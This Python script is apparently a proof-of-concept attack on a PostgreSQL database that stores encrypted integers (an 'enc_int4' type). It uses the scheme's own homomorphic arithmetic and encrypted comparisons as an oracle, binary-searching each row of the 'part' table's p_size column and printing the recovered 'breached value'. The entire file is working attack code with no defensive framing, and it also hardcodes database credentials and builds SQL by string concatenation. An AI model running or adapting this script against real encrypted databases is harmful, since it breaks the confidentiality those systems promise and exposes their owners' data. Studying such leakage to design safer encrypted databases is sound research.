#!/usr/bin/env python
# -*- coding: utf-8 -*-

import psycopg2
con = psycopg2.connect(database='test', user='postgres', password='password')
with con:
    cur = con.cursor()
    ### count the number to be breached
    cur.execute('SELECT COUNT(p_size) FROM part;')
    num = cur.fetchone()[0]
    print("total number = %d" % num)

    ### Phase-1: construction for atomic values
    cur.execute('CREATE TEMP TABLE tmp_t(id SERIAL NOT NULL, pivot enc_int4);')
    cur.execute('INSERT INTO tmp_t(pivot) (SELECT p_size - p_size FROM part WHERE p_partkey = 1); -- 0')
    cur.execute('INSERT INTO tmp_t(pivot) (SELECT p_size / p_size FROM part WHERE p_partkey = 1); -- 1')
    cur.execute('INSERT INTO tmp_t(pivot) (SELECT pivot + pivot FROM tmp_t WHERE id = 2); -- 2')
    cur.execute('INSERT INTO tmp_t(pivot) (SELECT pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot*pivot FROM tmp_t WHERE id = 3); -- 2^30')
    """
    cur.execute('SELECT * FROM tmp_t;')
    rows = cur.fetchall()
    for row in rows:
        print(f"{row[0]} {row[1]}")
    """

    for id in range(1, num+1):

        ### print original ciphertext
        cur.execute('SELECT p_size FROM part WHERE p_partkey =' + str(id) + ';')
        print("[%d] original string = %s" % (id, cur.fetchone()[0]))

        ### Phase-2: comparison using binary search
        cur.execute('DROP TABLE if exists tmp_t2; CREATE TEMP TABLE tmp_t2(id2 SERIAL NOT NULL, pivot2 enc_int4);')
        cur.execute('INSERT INTO tmp_t2(pivot2) (SELECT pivot FROM tmp_t WHERE id = 1); -- 0')
        cur.execute('INSERT INTO tmp_t2(pivot2) (SELECT pivot FROM tmp_t WHERE id = 4); -- 2^30')
        cur.execute('INSERT INTO tmp_t2(pivot2) (SELECT SUM(pivot2) FROM tmp_t2); -- get SUM')

        low = 0
        high = 2**30
        while low <= high:
            mid = (low + high) // 2
            cur.execute('UPDATE tmp_t2 SET pivot2 = (SELECT SUM(pivot2) FROM tmp_t2 WHERE id2 = 1 OR id2 = 2) WHERE id2 = 3; -- get SUM')
            cur.execute('UPDATE tmp_t2 SET pivot2 = (SELECT pivot2/pivot FROM tmp_t2,tmp_t WHERE id = 3 AND id2 = 3) WHERE id2 = 3; -- get AVG')

            cur.execute('SELECT pivot2 = p_size FROM tmp_t2, part WHERE id2 = 3 AND p_partkey =' + str(id) + ';')
            boolean = cur.fetchone()[0]
            if True == boolean:
                print("[%d] breached value = %d" % (id, mid))
                cur.execute('DROP TABLE tmp_t2;')
                break

            cur.execute('SELECT pivot2 < p_size FROM tmp_t2, part WHERE id2 = 3 AND p_partkey =' + str(id) + ';')
            boolean = cur.fetchone()[0]
            if True == boolean:
                low = mid + 1
                cur.execute('UPDATE tmp_t2 SET pivot2 = (SELECT pivot2+pivot FROM tmp_t2,tmp_t WHERE id2 = 3 AND id = 2) WHERE id2 = 3; -- mid + 1')
                cur.execute('UPDATE tmp_t2 SET pivot2 = (SELECT pivot2 FROM tmp_t2 WHERE id2 = 3) WHERE id2 = 1; -- low = mid + 1')
                continue

            cur.execute('SELECT pivot2 > p_size FROM tmp_t2, part WHERE id2 = 3 AND p_partkey =' + str(id) + ';')
            boolean = cur.fetchone()[0]
            if True == boolean:
                high = mid - 1
                cur.execute('UPDATE tmp_t2 SET pivot2 = (SELECT pivot2-pivot FROM tmp_t2,tmp_t WHERE id2 = 3 AND id = 2) WHERE id2 = 3; -- mid - 1')
                cur.execute('UPDATE tmp_t2 SET pivot2 = (SELECT pivot2 FROM tmp_t2 WHERE id2 = 3) WHERE id2 = 2; -- high = mid - 1')
                continue
